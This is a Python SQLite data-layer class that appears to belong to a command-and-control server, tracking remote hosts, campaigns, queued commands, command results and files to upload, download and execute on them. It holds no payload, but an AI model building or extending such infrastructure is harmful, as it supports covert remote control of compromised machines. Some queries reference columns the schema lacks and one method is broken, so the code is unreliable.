import sqlite3
import os

class db:
	
	database=None
	
	def __init__(self,store):
	
		self.database = sqlite3.connect(store, check_same_thread=False)		
		#self.createTables()
	

	def createTables(self):
		cursor = self.database.cursor()
		
		cursor.execute('''DROP TABLE IF EXISTS hosts''')
		cursor.execute('''DROP TABLE IF EXISTS executed_commands''')
		cursor.execute('''DROP TABLE IF EXISTS next_commands''')
		cursor.execute('''DROP TABLE IF EXISTS next_files''')

		cursor.execute('''CREATE TABLE IF NOT EXISTS hosts(
					id	INTEGER	PRIMARY KEY,
					name HOSTNAME default 'Unregistered Host',
					symmetric_key TEXT,
					campaign_id INTEGER DEFAULT 0,
					last_seen TEXT
				)''')
		
		cursor.execute('''CREATE TABLE IF NOT EXISTS executed_commands(
					id	INTEGER PRIMARY KEY,
					host_id INTEGER,					
					command_id INTEGER,				
					command TEXT,				
					result	TEXT,
					timestamp TEXT
					
				)''')
		cursor.execute('''CREATE TABLE IF NOT EXISTS next_commands(
					id	INTEGER PRIMARY KEY,
					host_id INTEGER,					
					next_command TEXT,
					timestamp DATETIME,
					state	TEXT
				)''')
		cursor.execute('''CREATE TABLE IF NOT EXISTS next_files(
					id	INTEGER PRIMARY KEY,
					host_id INTEGER,					
					file_name TEXT,
					remote_path TEXT,
					turbo	INTEGER,
					insecure INTEGER,
					timestamp DATETIME,
					direction INTEGER,
					state	TEXT
				)''')
		
		self.database.commit()
	
	def save_host(self,host_id,hostname,mac):
		existing_host=self.confirm_hostID(hostname,mac)
		if (existing_host is not None):
			existing_id=existing_host[0]
			if (existing_id is not None):
				new_key=self.get_symmetric_key(host_id)[0]
				try:
					cursor=self.database.cursor()
					cursor.execute('''UPDATE hosts SET symmetric_key=? WHERE id=?''', (new_key,existing_id,))
					self.database.commit()
					self.del_host(host_id)
					return existing_id
				except Exception as e:
					return None
		cursor=self.database.cursor()
		cursor.execute('''UPDATE hosts SET name=?,mac=?,campaign_id=0 WHERE id=?''', (hostname,mac,host_id,))
		self.database.commit()
		return host_id	

	def save_symmetric_key(self,key,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''UPDATE hosts SET symmetric_key=? WHERE id=?''', (key,host_ID,))
		self.database.commit()	

	def save_host_by_key(self,key):
		cursor=self.database.cursor()
		cursor.execute('''INSERT INTO hosts (symmetric_key) VALUES (?)''', (key,))
		self.database.commit()	

	def get_symmetric_key(self,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''SELECT symmetric_key FROM hosts WHERE id=?''',(host_ID,))
		return cursor.fetchone()

	def get_hostID(self,hostname):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id FROM hosts WHERE name=?''',(hostname,))
		return cursor.fetchone()

	def confirm_hostID(self,hostname,mac):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id FROM hosts WHERE name=? AND mac=?''',(hostname,mac,))
		return cursor.fetchone()

	def get_key_ID(self,key):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id FROM hosts WHERE symmetric_key=?''',(key,))
		return cursor.fetchone()

	def get_hostname(self,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''SELECT name FROM hosts WHERE id=?''',(host_ID,))
		return cursor.fetchone()
		
	def get_next_commands(self,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id,next_command FROM next_commands WHERE host_id=? and state="PENDING" ORDER BY timestamp''',(host_ID,))
		return cursor.fetchall()

	def get_next_pending_command(self,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id,next_command,timestamp FROM next_commands WHERE state="PENDING" AND host_id=? ORDER BY timestamp''',(host_ID,))
		return cursor.fetchone()
	def get_next_pending_file(self,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id,file_name,uploaded_file,timestamp,remote_path,turbo,insecure,direction,execute FROM next_files WHERE state="PENDING" AND host_id=? ORDER BY timestamp''',(host_ID,))
		return cursor.fetchone()

	def get_next_command_count(self,host_ID,command_id):
		cursor=self.database.cursor()
		cursor.execute('''SELECT count(*) FROM next_commands WHERE host_id=? and id=?''',(host_ID,command_id,))
		return cursor.fetchone()
	def get_next_command(self,host_ID,command_id):
		cursor=self.database.cursor()
		cursor.execute('''SELECT next_command FROM next_commands WHERE host_id=? and id=?''',(host_ID,command_id,))
		return cursor.fetchone()

	def update_sent_next_command(self,command_id):
		cursor=self.database.cursor()
		cursor.execute('''UPDATE next_commands SET state="SENT" WHERE id=?''',(command_id,))
		self.database.commit()

	def save_next_command(self,host_ID,next_command,timestamp,state):
		cursor=self.database.cursor()
		cursor.execute('''INSERT INTO next_commands (host_id,next_command,timestamp,state) VALUES (?,?,?,?)''',(host_ID,next_command,timestamp,state,))
		self.database.commit()

	def save_sending_file(self,host_ID,file_name,uploaded_file,remote_path,turbo,insecure,execute,timestamp,direction,state):
		cursor=self.database.cursor()
		cursor.execute('''INSERT INTO next_files (host_id,file_name,uploaded_file,remote_path,turbo,insecure,execute,timestamp,direction,state) VALUES (?,?,?,?,?,?,?,?,?,?)''',(host_ID,file_name,uploaded_file,remote_path,turbo,insecure,execute,timestamp,direction,state,))
		self.database.commit()

	def del_next_command(self,command_id):
		cursor=self.database.cursor()
		cursor.execute('''DELETE from next_commands WHERE id=?''',(command_id,))
		self.database.commit()

	def del_host(self,host_id):
		cursor=self.database.cursor()
		cursor.execute('''DELETE from hosts WHERE id=?''',(host_id,))
		self.database.commit()
	
	
	def get_command_result(host_ID,com_ID):
		cursor=db.cursor()
		cursor.execute('''SELECT result FROM executed_commands WHERE host_id=? AND command_id=?''',(host_ID,com_ID,))
		return c.fetchone()[0]

	def id_exists(self,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''SELECT count(*) FROM hosts WHERE id=?''',(host_ID,))
		return cursor.fetchone()[0]

	def get_registered_hosts(self):
		cursor=self.database.cursor()
		cursor.execute('''SELECT * FROM hosts''')
		return cursor.fetchall()

	def get_host_by_file_id(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''SELECT host_id FROM next_files WHERE id=?''',(file_id,))
		return cursor.fetchone()

	def get_registered_host(self,host_ID):
		cursor=self.database.cursor()
		cursor.execute('''SELECT * FROM hosts WHERE id=?''',(host_ID,))
		return cursor.fetchone()

	def update_host_timestamp(self,host_ID,timestamp):
		cursor=self.database.cursor()
		cursor.execute('''UPDATE hosts SET last_seen=?,terminated="F" WHERE id=?''',(timestamp,host_ID,))
		self.database.commit()

	def update_pending_file_to_sending(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''UPDATE next_files SET state="SENDING" WHERE id=?''',(file_id,))
		self.database.commit()
	def update_sending_file_to_pending(self,file_id):
                cursor=self.database.cursor()
                cursor.execute('''UPDATE next_files SET state="PENDING" WHERE id=?''',(file_id,))
                self.database.commit()
	def update_sending_file_to_save_error(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''UPDATE next_files SET state="SAVING ERROR" WHERE id=?''',(file_id,))
		self.database.commit()
	def update_sending_file_to_received(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''UPDATE next_files SET state="RECEIVED" WHERE id=?''',(file_id,))
		self.database.commit()
	def update_received_file_to_executed(self,file_id):
                cursor=self.database.cursor()
                cursor.execute('''UPDATE next_files SET state="EXECUTED" WHERE id=?''',(file_id,))
                self.database.commit()

	def save_command_result(self,host_ID,cmd,result,timestamp):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id FROM next_commands WHERE host_id=? and next_command=? and state="SENT"''',(host_ID,cmd,))
		cmd_id=cursor.fetchone()[0]
		cursor.execute('''INSERT INTO executed_commands (host_id,command_id,command,result,timestamp) VALUES(?,?,?,?,?)''',(host_ID,cmd_id,cmd,result,timestamp,))
		self.database.commit()
		self.del_next_command(cmd_id)
		


	def get_pending_command(self,host_id,cmd):
		cursor=self.database.cursor()
		cursor.execute('''SELECT id FROM next_commands WHERE state="SENT" and host_id=? and next_command=?''',(host_id,cmd,))
		return cursor.fetchone()
	def get_file_file_name(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''SELECT file_name FROM next_files WHERE id=?''',(file_id,))
		return cursor.fetchone()[0]
	def get_file_insecure(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''SELECT insecure FROM next_files WHERE id=?''',(file_id,))
		return cursor.fetchone()[0]
	def get_file_local_path(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''SELECT uploaded_file FROM next_files WHERE id=?''',(file_id,))
		file_name=cursor.fetchone()[0]
		local_path=os.path.join(os.path.dirname(os.path.realpath(__file__)),"..","uploads",file_name)
		return local_path
	def get_file_remote_path(self,file_id):
		cursor=self.database.cursor()
		cursor.execute('''SELECT remote_path FROM next_files WHERE id=?''',(file_id,))
		remote_path=cursor.fetchone()[0]
		return remote_path
	def get_domains(self):
		cursor=self.database.cursor()
		cursor.execute('''SELECT server_domain FROM campaign_details WHERE id>0 and server_domain IS NOT NULL;''')
		return cursor.fetchall()
	def get_servers_key(self):
		cursor=self.database.cursor()
		cursor.execute('''SELECT privkey FROM server WHERE id>0 and privkey IS NOT NULL;''')
		return cursor.fetchall()
		

